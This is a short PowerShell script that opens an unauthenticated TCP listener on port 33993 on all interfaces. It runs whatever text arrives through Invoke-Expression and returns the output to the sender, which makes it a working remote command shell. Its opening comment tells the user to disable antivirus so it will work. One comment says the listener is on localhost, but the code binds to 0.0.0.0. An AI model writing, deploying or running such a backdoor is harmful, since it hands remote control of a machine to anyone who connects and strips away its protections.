# This PS listens for commands on 33993 and runs it in the host machine.
# Disable AV before running it, otherwise it won't work.

# Create a new TCP listener on localhost:33993
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', 33993)
$listener.Start()

while ($true) {
    # Wait for a connection
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()

    # Receive the command from the client
    $buffer = New-Object System.Byte[] 1024
    $bytesRead = $stream.Read($buffer, 0, 1024)
    $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)

    # Run the command and get the output
    $output = Invoke-Expression $command
    $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output)

    # Send the output back to the client
    $stream.Write($outputBytes, 0, $outputBytes.Length)

    # Close the connection
    $client.Close()
}
